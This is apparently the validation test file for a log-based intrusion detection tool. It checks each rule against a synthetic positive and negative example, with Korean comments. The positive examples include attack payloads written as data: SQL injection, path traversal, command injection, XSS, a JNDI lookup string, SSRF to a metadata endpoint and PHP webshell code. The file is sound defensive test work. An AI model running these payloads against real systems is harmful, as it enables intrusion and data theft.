"""규칙 검증(ADS의 Validation 칸): 모든 탐지 규칙마다 '걸려야 하는 예'와 '걸리면 안 되는 비슷한 예'를 하나씩 둔다.

- 규칙이 새로 생기면 logsight/rulespec.py에 명세를, 여기에 양성·음성 예를 함께 넣어야 테스트가 통과한다.
- 입력은 모두 합성이고 IP는 문서용 대역(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24)만 쓴다.
- 기준값(5건, 10분 등)은 rulespec.SPEC['when']과 같아야 한다. 음성 예는 기준 바로 아래로 만든다.
실행: python -m unittest discover -s tests -v
"""
from __future__ import annotations

import json
import sys
import tempfile
import unittest
from datetime import datetime, timedelta, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(ROOT))

from logsight.detect import RULES, run_detections  # noqa: E402
from logsight.normalize import (cloudtrail_record_to_event, parse_alb, parse_guardduty,  # noqa: E402
                                parse_sshauth, parse_vpcflow, parse_waf)
from logsight.rulespec import SPEC  # noqa: E402
from logsight.web import webdetect, weblog, webscan  # noqa: E402
from logsight.web.webprofile import SiteProfile  # noqa: E402

T0 = datetime(2026, 10, 11, 5, 0, tzinfo=timezone.utc)
ATK = "198.51.100.7"
ACCT = "111122223333"


# ------------------------------------------------------------------ 입력 만들기
def ct(i, name, src="iam", ip=ATK, ident=None, params=None, err=None, sec=60, **kw):
    r = {"eventTime": (T0 + timedelta(seconds=i * sec)).strftime("%Y-%m-%dT%H:%M:%SZ"),
         "eventSource": f"{src}.amazonaws.com", "eventName": name, "sourceIPAddress": ip,
         "userIdentity": ident or {"type": "IAMUser", "userName": "dev",
                                   "arn": f"arn:aws:iam::{ACCT}:user/dev", "accessKeyId": "AKIAEXAMPLEKEY01"},
         "requestParameters": params or {}}
    if err:
        r["errorCode"] = err
    r.update(kw)
    return cloudtrail_record_to_event(r, f"ct:{i}")


def role(inst="i-0abc"):
    return {"type": "AssumedRole", "arn": f"arn:aws:sts::{ACCT}:assumed-role/web/{inst}",
            "accessKeyId": "ASIAEXAMPLEKEY01"}


ROOT_ID = {"type": "Root", "accountId": ACCT, "arn": f"arn:aws:iam::{ACCT}:root"}


def vpc(i, src, sp, dp, act="ACCEPT", dst="10.0.0.5"):
    t = int(T0.timestamp()) + i * 5
    return f"2 {ACCT} eni-0example {src} {dst} {sp} {dp} 6 5 400 {t} {t + 5} {act} OK"


def waf(i, action, labels=(), counted=(), args="id=1"):
    r = {"timestamp": int((T0 + timedelta(seconds=i)).timestamp() * 1000), "action": action,
         "httpRequest": {"clientIp": ATK, "uri": "/item", "args": args, "httpMethod": "GET", "headers": []},
         "labels": [{"name": n} for n in labels],
         "nonTerminatingMatchingRules": [{"ruleId": c} for c in counted]}
    return json.dumps(r)


def alb(i, path, st):
    t = (T0 + timedelta(seconds=i)).strftime("%Y-%m-%dT%H:%M:%S.000000Z")
    return (f'http {t} app/demo/abc {ATK}:44322 10.0.1.10:80 0.000 0.001 0.000 {st} {st} 34 366 '
            f'"GET http://demo{path} HTTP/1.1" "Mozilla/5.0" - - '
            f'arn:aws:elasticloadbalancing:ap-northeast-2:{ACCT}:targetgroup/t/1 "Root=1-x" "-" "-" 0 '
            f'{t} "forward" "-" "-" "10.0.1.10:80" "{st}" "-" "-"')


def ssh(i, kind, ip=ATK, user="admin"):
    ts = (T0 + timedelta(seconds=i * 10)).strftime("%b %d %H:%M:%S")
    if kind == "fail":
        return f"{ts} web sshd[{100 + i}]: Failed password for {user} from {ip} port {40000 + i} ssh2"
    return f"{ts} web sshd[{100 + i}]: Accepted password for {user} from {ip} port {40000 + i} ssh2"


def gd(sev):
    return json.dumps({"Id": "f1", "Type": "UnauthorizedAccess:EC2/SSHBruteForce", "Severity": sev,
                       "Title": "t", "CreatedAt": "2026-10-11T05:00:00Z",
                       "Resource": {"ResourceType": "Instance", "InstanceDetails": {"InstanceId": "i-0abc"}},
                       "Service": {"Action": {}, "Count": 1}})


def acc(i, path, st=200, by=100, ua="Mozilla/5.0", method="GET", ref="-", ip=ATK, sec=10):
    ts = (T0 + timedelta(seconds=i * sec)).strftime("%d/%b/%Y:%H:%M:%S +0000")
    return f'{ip} - - [{ts}] "{method} {path} HTTP/1.1" {st} {by} "{ref}" "{ua}"'


def aws_rules(evs, env=None):
    return {f.rule for f in run_detections([e for e in evs if e], env or {})}


def web_rules(lines, profile=None):
    evs = weblog.parse_access("\n".join(lines), "access.log")
    return {f.rule for f in webdetect.run_web_detections(evs, profile or SiteProfile())}


def file_rules(content, rel="shell.php"):
    with tempfile.TemporaryDirectory() as d:
        p = Path(d) / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content, encoding="utf-8")
        findings, _ = webscan.scan_webroot(SiteProfile(webroot=d))
        return {f.rule for f in findings}


INST_ENV = {"instances": [{"instance_id": "i-0abc", "public_ip": "203.0.113.10", "private_ip": "10.0.0.5"}]}
TRUST_ENV = {"trusted_ips": ["192.0.2.0/24"]}


def burst(name, n, src="iam", err=None, sec=60, **kw):
    return [ct(i, name if isinstance(name, str) else name[i % len(name)], src=src, err=err, sec=sec, **kw)
            for i in range(n)]


# ------------------------------------------------------------------ 규칙별 (양성, 음성)
# 값은 () -> 걸린 규칙 집합. 양성에는 그 규칙이 있어야 하고, 음성에는 없어야 한다.
CASES = {
    "CT_LOGGING_TAMPER": (lambda: aws_rules([ct(0, "StopLogging", "cloudtrail")]),
                          lambda: aws_rules([ct(0, "StartLogging", "cloudtrail")])),
    "CT_ROOT_USAGE": (lambda: aws_rules([ct(0, "ListBuckets", "s3", ident=ROOT_ID)]),
                      lambda: aws_rules([ct(0, "ListBuckets", "s3", ident=ROOT_ID, eventType="AwsServiceEvent")])),
    "CT_IAM_PERSISTENCE": (lambda: aws_rules([ct(0, "CreateAccessKey")]),
                           lambda: aws_rules([ct(0, "ListAccessKeys")])),
    "CT_SG_OPENED": (lambda: aws_rules([ct(0, "AuthorizeSecurityGroupIngress", "ec2",
                                           params={"ipPermissions": {"items": [{"ipRanges": {"items": [
                                               {"cidrIp": "0.0.0.0/0"}]}}]}})]),
                     lambda: aws_rules([ct(0, "AuthorizeSecurityGroupIngress", "ec2",
                                           params={"ipPermissions": {"items": [{"ipRanges": {"items": [
                                               {"cidrIp": "192.0.2.0/24"}]}}]}})])),
    "CT_S3_PUBLIC": (lambda: aws_rules([ct(0, "PutBucketAcl", "s3", params={"x-amz-acl": ["public-read"]})]),
                     lambda: aws_rules([ct(0, "PutBucketAcl", "s3", params={"x-amz-acl": ["private"]})])),
    "CT_SNAPSHOT_SHARE": (lambda: aws_rules([ct(0, "ModifySnapshotAttribute", "ec2",
                                                params={"createVolumePermission": {"add": {"items": [
                                                    {"userId": "444455556666"}]}}})]),
                          lambda: aws_rules([ct(0, "ModifySnapshotAttribute", "ec2",
                                                params={"attributeType": "description"})])),
    "CT_CONSOLE_NO_MFA": (lambda: aws_rules([ct(0, "ConsoleLogin", "signin", additionalEventData={"MFAUsed": "No"})]),
                          lambda: aws_rules([ct(0, "ConsoleLogin", "signin",
                                                additionalEventData={"MFAUsed": "Yes"})])),
    "CT_UNTRUSTED_IP": (lambda: aws_rules([ct(0, "ListBuckets", "s3")], TRUST_ENV),
                        lambda: aws_rules([ct(0, "ListBuckets", "s3", ip="192.0.2.5")], TRUST_ENV)),
    "CT_INSTANCE_CRED_OUTSIDE": (lambda: aws_rules([ct(0, "ListBuckets", "s3", ident=role())], INST_ENV),
                                 lambda: aws_rules([ct(0, "ListBuckets", "s3", ident=role(), ip="203.0.113.10")],
                                                   INST_ENV)),
    "CT_INSTANCE_CRED_MULTI_IP": (
        lambda: aws_rules([ct(0, "ListBuckets", "s3", ident=role(), ip="203.0.113.10"),
                           ct(1, "ListBuckets", "s3", ident=role(), ip="203.0.113.10"),
                           ct(2, "ListBuckets", "s3", ident=role(), ip=ATK)]),
        lambda: aws_rules([ct(i, "ListBuckets", "s3", ident=role(), ip="203.0.113.10") for i in range(3)])),
    "CT_ACCESS_DENIED_BURST": (lambda: aws_rules(burst("ListUsers", 5, err="AccessDenied")),
                               lambda: aws_rules(burst("ListUsers", 4, err="AccessDenied"))),
    "CT_DISCOVERY_BURST": (lambda: aws_rules(burst(["ListUsers", "ListRoles", "ListPolicies", "GetUser"], 4)),
                           lambda: aws_rules(burst(["ListUsers", "ListRoles", "ListPolicies"], 4))),
    "CT_S3_BULK_READ": (lambda: aws_rules(burst("GetObject", 20, src="s3", sec=10)),
                        lambda: aws_rules(burst("GetObject", 19, src="s3", sec=10))),
    "CT_RUN_INSTANCES_BURST": (lambda: aws_rules(burst("RunInstances", 5, src="ec2")),
                               lambda: aws_rules(burst("RunInstances", 5, src="ec2",
                                                       err="Client.InstanceLimitExceeded"))),
    "VPC_PORT_SCAN": (lambda: aws_rules(parse_vpcflow("\n".join(vpc(i, ATK, 51000, 20 + i) for i in range(10)))),
                      lambda: aws_rules(parse_vpcflow("\n".join(vpc(i, ATK, 51000, 20 + i) for i in range(9))))),
    "VPC_REMOTE_ADMIN_EXPOSED": (lambda: aws_rules(parse_vpcflow(vpc(0, ATK, 51000, 22))),
                                 lambda: aws_rules(parse_vpcflow(vpc(0, ATK, 51000, 22, act="REJECT")))),
    "WAF_SQLI_NOT_BLOCKED": (lambda: aws_rules(parse_waf(waf(0, "ALLOW", counted=["SQLi_QUERYARGUMENTS"]))),
                             lambda: aws_rules(parse_waf(waf(0, "ALLOW", counted=["SizeRestrictions_BODY"])))),
    "WAF_BLOCKED": (lambda: aws_rules(parse_waf(waf(0, "BLOCK"))),
                    lambda: aws_rules(parse_waf(waf(0, "ALLOW")))),
    "SSH_BRUTE_FORCE": (lambda: aws_rules(parse_sshauth("\n".join(ssh(i, "fail") for i in range(5)), year=2026)),
                        lambda: aws_rules(parse_sshauth("\n".join(ssh(i, "fail") for i in range(4)), year=2026))),
    "SSH_SUCCESS_AFTER_FAIL": (
        lambda: aws_rules(parse_sshauth("\n".join([ssh(0, "fail"), ssh(1, "fail"), ssh(2, "ok")]), year=2026)),
        lambda: aws_rules(parse_sshauth("\n".join([ssh(0, "fail"), ssh(2, "ok")]), year=2026))),
    "WEB_SQLI_PATTERN": (lambda: aws_rules(parse_alb(alb(0, "/item?id=1'%20or%201=1--", 200))),
                         lambda: aws_rules(parse_alb(alb(0, "/item?id=1", 200)))),
    "WEB_PATH_PROBE": (lambda: aws_rules(parse_alb("\n".join(alb(i, f"/p{i}x", 404) for i in range(20)))),
                       lambda: aws_rules(parse_alb("\n".join(alb(i, f"/p{i}x", 404) for i in range(19))))),
    "WEB_OBJECT_ENUM": (lambda: aws_rules(parse_alb("\n".join(alb(i, f"/api/jobs/job-{i}", 403) for i in range(5)))),
                        lambda: aws_rules(parse_alb("\n".join(alb(i, f"/api/jobs/job-{i}", 403) for i in range(4))))),
    "GD_FINDING": (lambda: aws_rules(parse_guardduty(gd(5))),
                   lambda: aws_rules(parse_guardduty("{}"))),
    # --- 웹서버 로그
    "WEBLOG_SQLI": (lambda: web_rules([acc(0, "/s.php?q=1%27%20union%20select%20pw%20from%20u")]),
                    lambda: web_rules([acc(0, "/s.php?q=select%20color%20from%20menu")])),
    "WEBLOG_TRAVERSAL": (lambda: web_rules([acc(0, "/v.php?f=../../etc/passwd")]),
                         lambda: web_rules([acc(0, "/v.php?f=report.pdf")])),
    "WEBLOG_RFI": (lambda: web_rules([acc(0, "/i.php?page=http://203.0.113.9/x.txt")]),
                   lambda: web_rules([acc(0, "/i.php?page=about")])),
    "WEBLOG_CMD_INJECTION": (lambda: web_rules([acc(0, "/ping.php?ip=1.1.1.1;id")]),
                             lambda: web_rules([acc(0, "/ping.php?ip=1.1.1.1")])),
    "WEBLOG_XSS": (lambda: web_rules([acc(0, "/s.php?q=%3Cscript%3Ealert(1)%3C/script%3E")]),
                   lambda: web_rules([acc(0, "/s.php?q=script")])),
    "WEBLOG_SCANNER": (lambda: web_rules([acc(0, "/", ua="sqlmap/1.7")]),
                       lambda: web_rules([acc(0, "/", ua="Mozilla/5.0")])),
    "WEBLOG_ENUM_404": (lambda: web_rules([acc(i, f"/n{i}", st=404) for i in range(15)]),
                        lambda: web_rules([acc(i, f"/n{i}", st=404) for i in range(14)])),
    "WEBLOG_SENSITIVE_FILE": (lambda: web_rules([acc(0, "/.env", st=404)]),
                              lambda: web_rules([acc(0, "/env.html", st=404)])),
    "WEBLOG_WEBSHELL_ACCESS": (lambda: web_rules([acc(0, "/img/a.php?cmd=whoami")]),
                               lambda: web_rules([acc(0, "/img/a.php?cmd=whoami", st=404)])),
    "WEBLOG_UPLOAD_EXEC": (lambda: web_rules([acc(0, "/uploads/x.php")]),
                           lambda: web_rules([acc(0, "/uploads/x.jpg")])),
    "WEBLOG_AUTH_BRUTE": (lambda: web_rules([acc(i, "/login", method="POST") for i in range(10)]),
                          lambda: web_rules([acc(i, "/login", method="POST") for i in range(9)])),
    "WEBLOG_AUTH_SUCCESS_AFTER_FAIL": (
        lambda: web_rules([acc(i, "/login", method="POST") for i in range(5)] + [acc(6, "/login", 302, method="POST")]),
        lambda: web_rules([acc(i, "/login", method="POST") for i in range(4)] + [acc(6, "/login", 302, method="POST")])),
    "WEBLOG_CODE_IN_HEADER": (lambda: web_rules([acc(0, "/", ua="<?php system($_GET['c']); ?>")]),
                              lambda: web_rules([acc(0, "/", ua="php-client/1.0")])),
    "WEBLOG_ADMIN_ACCESS": (lambda: web_rules([acc(0, "/admin/users")]),
                            lambda: web_rules([acc(0, "/admin/users")], SiteProfile(trusted_ips=[ATK + "/32"]))),
    "WEBLOG_SSRF": (lambda: web_rules([acc(0, "/fetch.php?url=http://169.254.169.254/latest/meta-data/")]),
                    lambda: web_rules([acc(0, "/fetch.php?url=https://www.example.com/")])),
    "WEBLOG_OPEN_REDIRECT": (lambda: web_rules([acc(0, "/go?next=https://evil.example/")]),
                             lambda: web_rules([acc(0, "/go?next=/home")])),
    "WEBLOG_IDOR_ENUM": (lambda: web_rules([acc(i, f"/order.php?id={i}") for i in range(10)]),
                         lambda: web_rules([acc(i, f"/order.php?id={i}") for i in range(9)])),
    "WEBLOG_ADMIN_FORGED": (lambda: web_rules([acc(0, "/admin/users")]),
                            lambda: web_rules([acc(0, "/admin/login.php", 302, method="POST"),
                                               acc(1, "/admin/users")])),
    "WEBLOG_CSRF_SUSPECT": (lambda: web_rules([acc(0, "/admin/delete", method="POST", ref="https://evil.example/")]),
                            lambda: web_rules([acc(0, "/admin/delete", method="POST", ref="http://localhost/admin")])),
    "WEBLOG_BACKUP_LEAK": (lambda: web_rules([acc(0, "/backup.zip")]),
                           lambda: web_rules([acc(0, "/backup.zip", st=404)])),
    "WEBLOG_DIR_LISTING": (lambda: web_rules([acc(0, "/uploads/")]),
                           lambda: web_rules([acc(0, "/uploads/", st=403)])),
    "WEBLOG_EXPLOIT_PROBE": (lambda: web_rules([acc(0, "/", ua="${jndi:ldap://203.0.113.9/a}")]),
                             lambda: web_rules([acc(0, "/", ua="curl/8.0")])),
    "WEBLOG_EXPLOIT_5XX": (lambda: web_rules([acc(0, "/v.php?f=../../etc/passwd", st=500)]),
                           lambda: web_rules([acc(0, "/v.php?f=report.pdf", st=500)])),
    "WEBLOG_LARGE_EXFIL": (lambda: web_rules([acc(0, "/v.php?f=../../etc/passwd", by=60000)]),
                           lambda: web_rules([acc(0, "/v.php?f=../../etc/passwd", by=40000)])),
    # --- 파일 검사
    "FILE_WEBSHELL": (lambda: file_rules("<?php eval(base64_decode($_POST['x'])); system($_GET['c']); ?>"),
                      lambda: file_rules("<?php echo 'hello'; ?>")),
    "FILE_SUSPICIOUS": (lambda: file_rules("<?php preg_replace('/x/e', 'y', 'z'); ?>"),
                        lambda: file_rules("<?php echo 'hello'; ?>")),
}


class RuleSpecCompleteness(unittest.TestCase):
    def test_every_rule_has_spec_and_validation(self):
        self.assertEqual(set(RULES), set(SPEC), "규칙과 명세(rulespec.SPEC)가 맞지 않음")
        self.assertEqual(set(RULES), set(CASES), "검증 예(CASES)가 없는 규칙이 있음")
        for r, s in SPEC.items():
            for k in ("logs", "when", "blind", "fp", "first"):
                self.assertTrue(s.get(k), f"{r}의 {k}가 비어 있음")

    def test_doc_is_up_to_date(self):
        sys.path.insert(0, str(ROOT / "scripts"))
        from rule_spec_doc import render
        doc = (ROOT / "docs" / "규칙_명세.md").read_text(encoding="utf-8")
        self.assertEqual(doc, render(), "docs/규칙_명세.md가 오래됨: python scripts/rule_spec_doc.py 실행")


class RuleValidation(unittest.TestCase):
    def test_positive_and_negative(self):
        for rule, (pos, neg) in CASES.items():
            with self.subTest(rule=rule):
                self.assertIn(rule, pos(), f"{rule}: 걸려야 하는 예에서 안 걸림")
                self.assertNotIn(rule, neg(), f"{rule}: 걸리면 안 되는 예에서 걸림")


if __name__ == "__main__":
    unittest.main()
